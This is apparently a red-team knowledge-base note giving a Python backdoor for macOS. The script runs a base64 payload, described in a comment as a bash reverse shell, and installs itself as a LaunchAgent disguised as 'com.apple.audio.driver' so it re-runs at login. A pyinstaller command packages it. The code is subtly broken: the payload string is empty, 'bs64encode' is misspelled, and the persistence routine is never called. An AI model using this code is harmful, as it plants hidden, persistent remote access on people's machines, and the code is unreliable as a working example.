# Scripting

## Python

```python
import base64
import ctypes
import os

# Base64 encoded one-liner bash reverse shell
PAYLOAD = ""

libc = ctypes.CDLL(None)

def execute_command(command):
    execute = libc.system(command.encode())
    return execute

def decode_payload():
    decoded = base64.b64decode(PAYLOAD).decode('utf-8')
    return decoded

def persistence():
    plist_content = """<?xml version="1.0"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.audio.driver</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python</string>
        <string>-c</string>
        <string>import base64,sys;exec(base64.b64decode('{}').decode())</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>"""

    with open(__file__, 'r') as f:
        content = base64.bs64encode(f.read().encode()).decode()
    plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.audio.driver.plist")

    with open(plist_path, 'w') as f:
        f.write(plist_content.format(content))

    os.system(f"launchctl load {plist_path}")

    return True

def main():
    command = decode_payload()
    execute_command(command)

if __name__ == "__main__":
    main()
```

Compile this in the OSX system.

```
$ pyinstaller -F payload.py
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x07 - Maintaining Access/Persistence/Desktop/OSX/Backdoors/LaunchCTL/Manual/Living off the Land|Maintaining Access: OSX Persistence LaunchCTL]]

### YouTube

- [Cybersec Revolution: Fileless Malware on Mac - Coding & Bypassing Apple Security (Red Teaming Simulation Demo)](https://www.youtube.com/watch?v=CX6ILKPUkJ0)